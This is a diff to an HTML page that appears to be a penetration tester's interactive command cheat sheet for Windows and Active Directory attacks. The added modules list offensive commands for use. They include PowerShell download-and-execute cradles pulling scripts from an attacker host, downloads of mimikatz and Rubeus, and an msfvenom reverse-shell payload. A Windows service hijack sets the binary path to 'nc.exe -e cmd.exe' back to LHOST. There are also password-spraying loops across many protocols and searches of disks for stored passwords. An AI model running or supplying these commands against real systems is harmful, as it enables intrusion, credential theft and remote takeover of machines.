@@ -11,7 +11,10 @@
     *{margin:0;padding:0;box-sizing:border-box}
     body{background:#0b0f1a;color:#c8d6e5;font-family:'Inter',sans-serif;font-size:14px;line-height:1.5;display:flex;justify-content:center;padding:12px;min-height:100vh;background:radial-gradient(circle at 20% 30%,#0e1424,#060a12)}
     .app{max-width:1400px;width:100%;display:flex;gap:20px;background:rgba(8,12,24,.94);border:1px solid rgba(0,180,255,.08);border-radius:24px;padding:24px;box-shadow:0 12px 48px rgba(0,0,0,.9);min-height:80vh}
-    .sidebar{width:220px;min-width:220px;background:rgba(2,6,16,.5);border:1px solid rgba(0,180,255,.06);border-radius:16px;padding:18px 14px;display:flex;flex-direction:column;gap:12px;height:fit-content;position:sticky;top:12px}
+    .sidebar{width:220px;min-width:220px;background:rgba(2,6,16,.5);border:1px solid rgba(0,180,255,.06);border-radius:16px;padding:18px 14px;display:flex;flex-direction:column;gap:12px;height:80vh;position:sticky;top:12px;overflow-y:auto}
+    .sidebar::-webkit-scrollbar{width:4px}
+    .sidebar::-webkit-scrollbar-track{background:rgba(0,180,255,.05);border-radius:10px}
+    .sidebar::-webkit-scrollbar-thumb{background:rgba(0,180,255,.3);border-radius:10px}
     .sidebar-title{font-family:'Orbitron',sans-serif;font-size:.65rem;text-transform:uppercase;letter-spacing:2px;color:#5f7a9a;padding-bottom:8px;border-bottom:1px solid rgba(0,180,255,.06);margin-bottom:4px;font-weight:600}
     .sidebar-item{display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:10px;color:#8ab4d6;font-family:'JetBrains Mono',monospace;font-size:.7rem;cursor:pointer;border:1px solid transparent;transition:.15s}
     .sidebar-item:hover{background:rgba(0,180,255,.06);border-color:rgba(0,180,255,.1);color:#b0e0ff}
@@ -41,7 +44,7 @@
     .doc-box strong{color:#7c9bff}
     .doc-box code{color:#7c9bff;background:rgba(0,10,24,.5);padding:2px 8px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.7rem}
     .doc-box .highlight{color:#00b4ff}
-    @media(max-width:860px){.app{flex-direction:column;padding:16px}.sidebar{width:100%;min-width:unset;position:relative;top:0;flex-direction:row;flex-wrap:wrap;padding:12px 14px;gap:6px}.sidebar-title{width:100%}.sidebar-item{padding:6px 12px;font-size:.65rem}.title{font-size:1.3rem}.doc-box{font-size:.6rem}}
+    @media(max-width:860px){.app{flex-direction:column;padding:16px}.sidebar{width:100%;min-width:unset;position:relative;top:0;flex-direction:row;flex-wrap:wrap;padding:12px 14px;gap:6px;height:auto;max-height:200px;overflow-y:auto}.sidebar-title{width:100%}.sidebar-item{padding:6px 12px;font-size:.65rem}.title{font-size:1.3rem}.doc-box{font-size:.6rem}}
     @media(max-width:680px){.var-item input{width:70px}.app{padding:12px}.vars{padding:8px 12px;gap:4px 12px}}
   </style>
 </head>
@@ -54,12 +57,30 @@
     <div class="sidebar-item active" data-filter="nmap">
       <span class="label">nmap</span>
     </div>
+    <div class="sidebar-item active" data-filter="fuzzing">
+      <span class="label">fuzzing</span>
+    </div>
+    <div class="sidebar-item active" data-filter="windows_priv">
+      <span class="label">windows_priv</span>
+    </div>
+    <div class="sidebar-item active" data-filter="windows_service_attack">
+      <span class="label">windows_service_attack</span>
+    </div>
 
-    <div class="sidebar-item active" data-filter="userenum">
+    <div class="sidebar-item" data-filter="userenum">
       <span class="label">userenum</span>
     </div>
+    <div class="sidebar-item" data-filter="ldapsearch">
+      <span class="label">ldapsearch</span>
+    </div>
+    <div class="sidebar-item" data-filter="lookupsid">
+      <span class="label">lookupsid</span>
+    </div>
+    <div class="sidebar-item" data-filter="rpcclient">
+      <span class="label">rpcclient</span>
+    </div>
     
-    <div class="sidebar-item active" data-filter="spray">
+    <div class="sidebar-item" data-filter="spray">
       <span class="label">spray</span>
     </div>
     <div class="sidebar-item" data-filter="ldap">
@@ -80,11 +101,32 @@
     <div class="sidebar-item" data-filter="groups">
       <span class="label">groups</span>
     </div>
+    <div class="sidebar-item" data-filter="smbclient">
+      <span class="label">smbclient</span>
+    </div>
     <div class="sidebar-item" data-filter="bloodhound">
       <span class="label">bloodhound</span>
     </div>
+    <div class="sidebar-item" data-filter="asreproast">
+      <span class="label">asreproast</span>
+    </div>
+    <div class="sidebar-item" data-filter="kerberoast">
+      <span class="label">kerberoast</span>
+    </div>
+    <div class="sidebar-item" data-filter="adcs">
+      <span class="label">adcs</span>
+    </div>
+    <div class="sidebar-item" data-filter="ntlm_attack">
+      <span class="label">ntlm_attack</span>
+    </div>
+    <div class="sidebar-item" data-filter="smbpasswd">
+      <span class="label">smbpasswd</span>
+    </div>
     <div class="sidebar-item" data-filter="nxcdump">
       <span class="label">nxcdump</span>
+    </div>
+    <div class="sidebar-item" data-filter="rdp">
+      <span class="label">rdp</span>
     </div>
 
   <!-- END LINES -->
@@ -99,7 +141,8 @@
 
     <!-- variables -->
     <div class="vars" id="vars">
-      <div class="var-item"><label>TARGET</label><input id="vTARGET" value="ips" /></div>
+      <div class="var-item"><label>LHOST</label><input id="vLHOST" value="10.10.10.4" /></div>
+      <div class="var-item"><label>TARGET</label><input id="vTARGET" value="10.10.10.50" /></div>
       <div class="var-item"><label>USER</label><input id="vUSER" value="bob" /></div>
       <div class="var-item"><label>PASS</label><input id="vPASS" value="P@ssw0rd" /></div>
       <div class="var-item"><label>DOMAIN</label><input id="vDOMAIN" value="domain.local" placeholder="domain.local" /></div>
@@ -114,116 +157,503 @@
   (function(){
     const CMD_DATA = [
       // ===== NMAP MODULE =====
-      { cmd: 'nmap -p- -Pn $(cat {TARGET}) -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt', category: 'nmap' },
-      { cmd: 'nmap -Pn $(cat {TARGET}) -sV -sC -v -oN nmap_sVsC.txt', category: 'nmap' },
-      { cmd: 'nmap -T4 -Pn $(cat {TARGET}) -v --script vuln -oN nmap_vuln.txt ', category: 'nmap' },
+      { cmd: 'fping -asgq {TARGET}/24', category: 'nmap' },
+      { cmd: 'nmap -sn {TARGET}/24', category: 'nmap' },
+      { cmd: 'nxc smb {TARGET}/24', category: 'nmap' },
+      { cmd: `echo '{TARGET}' > dcip `, category: 'nmap' },
+      { 
+      cmd: `cat > ips << 'EOF'
+192.168.1.101
+192.168.1.102
+192.168.1.103
+EOF
+`,
+  category: 'nmap' 
+},
+      { cmd: 'setup {TARGET}', category: 'nmap' },
+      { cmd: 'cleanup', category: 'nmap' },
+      { cmd: 'nmap -p- -Pn {TARGET} -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt', category: 'nmap' },
+      { cmd: 'nmap -Pn {TARGET} -sV -sC -v -oN nmap_sVsC.txt', category: 'nmap' },
+      { cmd: 'nmap -T4 -Pn {TARGET} -v --script vuln -oN nmap_vuln.txt ', category: 'nmap' },
+      { cmd: 'nmap -T4 -Pn -sV -sC -sT  ', category: 'nmap' },
+      { cmd: 'nmap -sU -p 53 --open {TARGET}/24  ', category: 'nmap' },
+      { cmd: `sudo chattr -i /etc/resolv.conf`, category: 'nmap' },
+      { cmd: `sudo nano /etc/resolv.conf`, category: 'nmap' },
+      { cmd: `nameserver {TARGET}`, category: 'nmap' },
+      { cmd: `for i in {1..254}; do echo -n "10.5.2.$i "; dig +short -x 10.5.2.$i; done > /tmp/ptrs.txt`, category: 'nmap' },
+      { cmd: `dig axfr @{TARGET} 2.5.10.in-addr.arpa `, category: 'nmap' },
+      { cmd: `dig axfr @{TARGET} {DOMAIN}`, category: 'nmap' },
+      { cmd: `dns {DOMAIN} -n {TARGET}`, category: 'nmap' },
 
 
-      // ===== SMB MODULE =====
+
+
+
+      // ===== fuzzing MODULE =====     
+      { cmd: `Gobuster Dirs:`, category: 'fuzzing' },
+      { cmd: `gobuster dir -u http://{TARGET} -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,html,txt,asp,aspx,jsp,bak,backup,old,zip,7z,cgi`, category: 'fuzzing' },
+      { cmd: `gobuster dir -u http://{TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,bak,backup,old`, category: 'fuzzing' },
+      { cmd: ` `, category: 'fuzzing' },
+      { cmd: `Feroxbuster Dirs:`, category: 'fuzzing' },
+      { cmd: `feroxbuster -u http://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,zip`, category: 'fuzzing' },
+      { cmd: `feroxbuster -u http://{TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,sh,py,cgi`, category: 'fuzzing' },
+      { cmd: ``, category: 'fuzzing' },
+      { cmd: `Ffuf Dirs:`, category: 'fuzzing' },
+      { cmd: `ffuf -u http://{TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e .php,.html,.txt,.bak,.js,.cgi,.asp,.aspx,.zip`, category: 'fuzzing' },
+      { cmd: `ffuf -u http://{TARGET}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -e .php,.html,.txt,.bak,.js,.cgi`, category: 'fuzzing' },
+      { cmd: `ffuf -u http://{TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e .php,.html,.txt,.bak,.js,.cgi`, category: 'fuzzing' },
+      { cmd: `ffuf -u http://{TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .php,.html,.txt,.bak,.js,.cgi`, category: 'fuzzing' },
+      { cmd: ` `, category: 'fuzzing' },
+      { cmd: `# vhost subdomains`, category: 'fuzzing' },
+      { cmd: `ffuf -u http://{TARGET} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt`, category: 'fuzzing' },
+      { cmd: `ffuf -u http://{TARGET} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`, category: 'fuzzing' },
+      { cmd: `ffuf -u http://{TARGET} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`, category: 'fuzzing' },
+      { cmd: ` `, category: 'fuzzing' },
+      { cmd: `LFI paramaters fuzzing:`, category: 'fuzzing' },
+      { cmd: `ffuf -u "http://{TARGET}/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`, category: 'fuzzing' },
+      { cmd: `ffuf -u 'https://{TARGET}/page.php?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`, category: 'fuzzing' },
+      { cmd: ``, category: 'fuzzing' },
+      { cmd: `wget https://raw.githubusercontent.com/whiteknight7/wordlist/main/fuzz-lfi-params-list.txt`, category: 'fuzzing' },
+      { cmd: `ffuf -u 'http://{TARGET}/page.php?FUZZ=../../../../../../../../etc/passwd' -w ./fuzz-lfi-params-list.txt`, category: 'fuzzing' },
+
+
+
+
+      // ===== windows_priv MODULE =====
+      { cmd: `--------------------Windows privilege escalation-------------------------`, category: 'windows_priv' },
+      { cmd: `powershell -ep bypass`, category: 'windows_priv' },
+      { cmd: `powershell.exe -ExecutionPolicy Bypass`, category: 'windows_priv' },
+      { cmd: `--------------------PowerUp--------------------`, category: 'windows_priv' },
+      { cmd: `wget https://raw.githubusercontent.com/punishell/ADCheatSheet/refs/heads/master/PowerUp.ps1`, category: 'windows_priv' },
+      { cmd: `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/PowerUp.ps1 | iex; Invoke-AllChecks"`, category: 'windows_priv' },
+      { cmd: `--------------------PrivescCheck--------------------`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1`, category: 'windows_priv' },
+      { cmd: `#find - status and serverity: high`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/PrivescCheck.ps1 | iex; Invoke-PrivescCheck"`, category: 'windows_priv' },
+      { cmd: `--------------------jaws-enum--------------------`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/411Hall/JAWS/raw/refs/heads/master/jaws-enum.ps1`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/jaws-enum.ps1 | iex"`, category: 'windows_priv' },
+      { cmd: `.\\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt`, category: 'windows_priv' },
+      { cmd: `--------------------winPEAS--------------------`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -O winPEAS.exe`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/winPEAS.exe -o winPEAS.exe"`, category: 'windows_priv' },
+      { cmd: `--------------------mimikatz--------------------`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/boboaung1337/exe/raw/refs/heads/main/mimikatz.exe`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/mimikatz.exe -o mimikatz.exe"`, category: 'windows_priv' },
+      { cmd: `--------------------Rubeus--------------------`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/boboaung1337/exe/raw/refs/heads/main/Rubeus.exe`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/Rubeus.exe -o Rubeus.exe"`, category: 'windows_priv' },
+      { cmd: `--------------------PowerView--------------------`, category: 'windows_priv' },
+      { cmd: `https://powersploit.readthedocs.io/en/latest/Recon/#powerview`, category: 'windows_priv' },
+      { cmd: `https://gist.githubusercontent.com/macostag/44591910288d9cc8a1ed6ea35ac4f30f/raw/dff7fa1dc2c8d7d46653cb4455dbbd0f5cb135a0/PowerView-3.0.ps1`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/BC-SECURITY/Empire/raw/refs/heads/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1 -O PowerView.ps1`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1 -O PowerView.ps1`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/PowerView.ps1 -O PowerView.ps1"`, category: 'windows_priv' },
+      { cmd: `iex(iwr -usebasicparsing http://{LHOST}/PowerView.ps1)`, category: 'windows_priv' },
+      { cmd: `IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}/PowerView.ps1')`, category: 'windows_priv' },
+      { cmd: `. .\\powerview.ps1`, category: 'windows_priv' },
+      { cmd: `Import-Module .\\PowerView.ps1`, category: 'windows_priv' },
+      { cmd: `--------------------wesng--------------------`, category: 'windows_priv' },
+      { cmd: `uv tool install git+https://github.com/bitsadmin/wesng`, category: 'windows_priv' },
+      { cmd: `wes --update`, category: 'windows_priv' },
+      { cmd: `wes systeminfo.txt`, category: 'windows_priv' },
+      { cmd: `wes systeminfo.txt -e -s critical`, category: 'windows_priv' },
+      { cmd: `--------------------credshunter--------------------`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/NeCr00/Credential-Hunting/releases/latest/download/credshunter.ps1`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/credshunter.ps1 -o credshunter.ps1"`, category: 'windows_priv' },
+      { cmd: `.\\credshunter.ps1 -Path C:\\ -OutputFile loot.txt`, category: 'windows_priv' },
+      { cmd: `--------------------snaffler--------------------`, category: 'windows_priv' },
+      { cmd: `uv tool install snaffler-ng`, category: 'windows_priv' },
+      { cmd: `snaffler -u {USER} -p {PASS} -d {DOMAIN} -c {TARGET}`, category: 'windows_priv' },
+      { cmd: `cat snaffler.db  | sqlite3  | sqlitebrowser`, category: 'windows_priv' },
+      { cmd: `--------------------cmd--------------------`, category: 'windows_priv' },
+      { cmd: `whoami /priv`, category: 'windows_priv' },
+      { cmd: `ls -force`, category: 'windows_priv' },
+      { cmd: `tree /F`, category: 'windows_priv' },
+      { cmd: `cd 'C:\\$Recycle.Bin'`, category: 'windows_priv' },
+      { cmd: `--------------------manual finding--------------------`, category: 'windows_priv' },
+      { cmd: `paste -sd, users.txt | sed 's/[^,]*/"&"/g'`, category: 'windows_priv' },
+      { cmd: `Get-ChildItem -Path C:\\ -Recurse -Force -Include *.config,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '(C:\\\\Windows)' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass="`, category: 'windows_priv' },
+
+
+
+
+
+      // ===== windows_service_attack MODULE =====
+      { cmd: `powershell.exe -c service`, category: 'windows_service_attack' },
+      { cmd: `powershell.exe -c ps`, category: 'windows_service_attack' },
+      { cmd: `powershell.exe -c get-process`, category: 'windows_service_attack' },
+      { cmd: `netstat -ano | findstr /i listening`, category: 'windows_service_attack' },
+      { cmd: `reg query 'HKEY_LOCAL_MACHINE\\SOFTWARE\\'`, category: 'windows_service_attack' },
+      { cmd: `cd \\Windows\\System32\\Tasks`, category: 'windows_service_attack' },
+      { cmd: `cd \\windows\\tasks`, category: 'windows_service_attack' },
+      { cmd: `wget https://live.sysinternals.com/Accesschk.exe`, category: 'windows_service_attack' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/Accesschk.exe -o Accesschk.exe"`, category: 'windows_service_attack' },
+      { cmd: `Accesschk.exe /accepteula -uwqv "C:\\vuln.exe"`, category: 'windows_service_attack' },
+      { cmd: `Accesschk.exe /accepteula -uwqv servicename`, category: 'windows_service_attack' },
+      { cmd: `sc.exe query "<servicename>"`, category: 'windows_service_attack' },
+      { cmd: `sc.exe qc "<servicename>"`, category: 'windows_service_attack' },
+      { cmd: `sc.exe sdshow "<servicename>"|ConvertFrom-SddlString`, category: 'windows_service_attack' },
+      { cmd: `icacls c:\\vuln.exe`, category: 'windows_service_attack' },
+      { cmd: `get-acl "c:\vuln.exe" |fl`, category: 'windows_service_attack' },
+      { cmd: `Get-Acl -Path "C:\\vuln.exe" |fl`, category: 'windows_service_attack' },
+      { cmd: `move c:\vuln.exe c:\\vuln.exe.bak`, category: 'windows_service_attack' },
+      { cmd: `copy .\shell.exe c:\\vuln.exe`, category: 'windows_service_attack' },
+      { cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe`, category: 'windows_service_attack' },
+      { cmd: `.\\shell.exe`, category: 'windows_service_attack' },
+      { cmd: `c:\\vuln.exe`, category: 'windows_service_attack' },
+      { cmd: `sc.exe config <servicename> binpath= "C:\\Users\\public\\nc.exe -e cmd.exe {LHOST} 443"`, category: 'windows_service_attack' },
+      { cmd: `Restart-Computer `, category: 'windows_service_attack' },
+      { cmd: `shutdown /r /t 0`, category: 'windows_service_attack' },
+      { cmd: `sc.exe start "<servicename>"   |   sc.exe stop "<servicename>"`, category: 'windows_service_attack' },
+      { cmd: `net start "<servicename>"      |   net stop "<servicename>"`, category: 'windows_service_attack' },
+
+
+
+
+
+
+
+
+      // ===== spray MODULE =====
       { cmd: 'powershell -c type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt', category: 'spray' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -M powershell_history', category: 'spray' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} ', category: 'spray' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --local-auth ', category: 'spray' },
-      { cmd: 'nxc smb {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc smb {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc winrm {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc winrm {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc rdp {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc rdp {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc mssql {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc mssql {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc ldap {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc ldap {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc wmi {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc wmi {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc ftp {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc ftp {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc ssh {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc ssh {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc nfs {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc nfs {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc vnc {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
-      { cmd: 'nxc vnc {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --local-groups', category: 'spray' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --shares', category: 'spray' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --groups', category: 'spray' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -M powershell_history`, category: 'spray' },
+      { cmd: `Available Protocols: {winrm,ssh,ftp,smb,mssql,nfs,wmi,vnc,rdp,ldap} and Kerberos Authentication: ( -k ) `, category: 'spray' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' `, category: 'spray' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' --local-auth `, category: 'spray' },
+      { cmd: `nxc smb {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc smb {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success`, category: 'spray' },
+      { cmd: `nxc winrm {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc winrm {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success` ,category: 'spray' },
+      { cmd: `nxc rdp {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc rdp {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success`, category: 'spray' },
+      { cmd: `nxc mssql {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc mssql {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success`, category: 'spray' },
+      { cmd: `nxc ldap {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc ldap {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success`, category: 'spray' },
+      { cmd: `nxc wmi {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc wmi {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success`, category: 'spray' },
+      { cmd: `nxc ftp {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc ftp {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success`, category: 'spray' },
+      { cmd: `nxc ssh {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc ssh {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success`, category: 'spray' },
+      { cmd: `nxc nfs {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc nfs {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success`, category: 'spray' },
+      { cmd: `nxc vnc {TARGET} -u users.txt -p '{PASS}' --continue-on-success`, category: 'spray' },
+      { cmd: `nxc vnc {TARGET} -u users.txt -p '{PASS}' --local-auth --continue-on-success`, category: 'spray' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --local-groups`, category: 'spray' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --shares`, category: 'spray' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --groups`, category: 'spray' },
       
+
+
       // ===== LDAP MODULE =====
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --password-not-required', category: 'ldap' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --admin-count', category: 'ldap' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M get-unixUserPassword', category: 'ldap' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M get-userPassword', category: 'ldap' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M laps', category: 'ldap' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M maq', category: 'ldap' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M pre2k', category: 'ldap' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --password-not-required`, category: 'ldap' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --admin-count`, category: 'ldap' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M get-unixUserPassword`, category: 'ldap' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M get-userPassword`, category: 'ldap' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M laps`, category: 'ldap' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M maq`, category: 'ldap' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M pre2k`, category: 'ldap' },
       
+
+
       // ===== KEEPASS MODULE =====
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M keepass_discover', category: 'keepass' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M keepass_trigger -o ACTION=ALL', category: 'keepass' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M keepass_discover`, category: 'keepass' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M keepass_trigger -o ACTION=ALL`, category: 'keepass' },
       
+
+
       // ===== USERS MODULE =====
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --loggedon-users', category: 'users' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --sessions', category: 'users' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --users', category: 'users' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --users', category: 'users' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M get-desc-users', category: 'users' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M get-info-users', category: 'users' },
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M user-desc -o KEYWORDS=pwd,admin', category: 'users' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --loggedon-users`, category: 'users' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --sessions`, category: 'users' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --users`, category: 'users' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --users`, category: 'users' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M get-desc-users`, category: 'users' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M get-info-users`, category: 'users' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} -M user-desc -o KEYWORDS=pwd,admin`, category: 'users' },
       
+
+
       // ===== PASS-POL MODULE =====
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --pass-pol', category: 'passpol' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --pass-pol`, category: 'passpol' },
       
+
+
       // ===== GROUPS MODULE =====
-      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --groups', category: 'groups' },
